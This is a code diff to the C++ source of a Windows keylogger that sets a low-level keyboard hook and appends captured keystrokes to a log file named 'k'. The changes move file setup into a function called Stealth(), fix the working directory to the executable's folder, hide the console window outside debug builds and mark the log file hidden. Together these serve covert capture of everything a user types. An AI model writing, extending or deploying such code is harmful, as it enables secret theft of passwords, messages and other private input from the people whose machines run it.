@@ -1,4 +1,5 @@
-#include <Windows.h>
+#include <windows.h>
+#include <shlwapi.h>
 #include <cstdio>
 #include <fstream>
 #include <iostream>
@@ -16,7 +17,7 @@ HHOOK _hook;
 // it contains the thing you will need: vkCode = virtual key code.
 KBDLLHOOKSTRUCT kbdStruct;
 
-std::ofstream output_file;
+std::ofstream out;
 
 void ReleaseHook()
 {
@@ -206,8 +207,8 @@ int Save(int key_stroke)
     }
 
     // instead of opening and closing file handlers every time, keep file open and flush.
-    output_file << output.str();
-    output_file.flush();
+    out << output.str();
+    out.flush();
 
     std::cout << output.str();
 
@@ -251,30 +252,36 @@ void SetHook()
 
 void Stealth()
 {
-#ifdef visible
+    // set current working directory
+    WCHAR cwd[MAX_PATH] = { 0 };
+    GetModuleFileName(NULL, cwd, MAX_PATH);
+    PathRemoveFileSpec(cwd); // shlwapi.lib
+    SetCurrentDirectory(cwd);
+    
+    std::wstring output_filename = L"k";
+
+    // open output file in append mode
+    out.open(output_filename, std::ios_base::app);
+    if (out.is_open())
+        OutputDebugString(L"Created output file\n");
+    else
+        OutputDebugString(L"Could not create output file\n"), exit(1);
+
+#ifdef _DEBUG
     ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
 #else
     ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
 #endif
-}
-
-int main(int argc, char** argv)
-{
-    std::wstring output_filename = L"k";
-
-    // open output file in append mode
-    output_file.open(output_filename, std::ios_base::app);
-    if (output_file.is_open())
-        OutputDebugString(L"Created output file\n");
-    else
-        OutputDebugString(L"Could not create output file\n"), exit(1);
 
     DWORD attr = GetFileAttributes(output_filename.c_str());
     if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
         SetFileAttributes(output_filename.c_str(), attr | FILE_ATTRIBUTE_HIDDEN);
         OutputDebugString(L"File hidden");
     }
+}
 
+int main(int argc, char** argv)
+{
     // visibility of window
     Stealth();
 
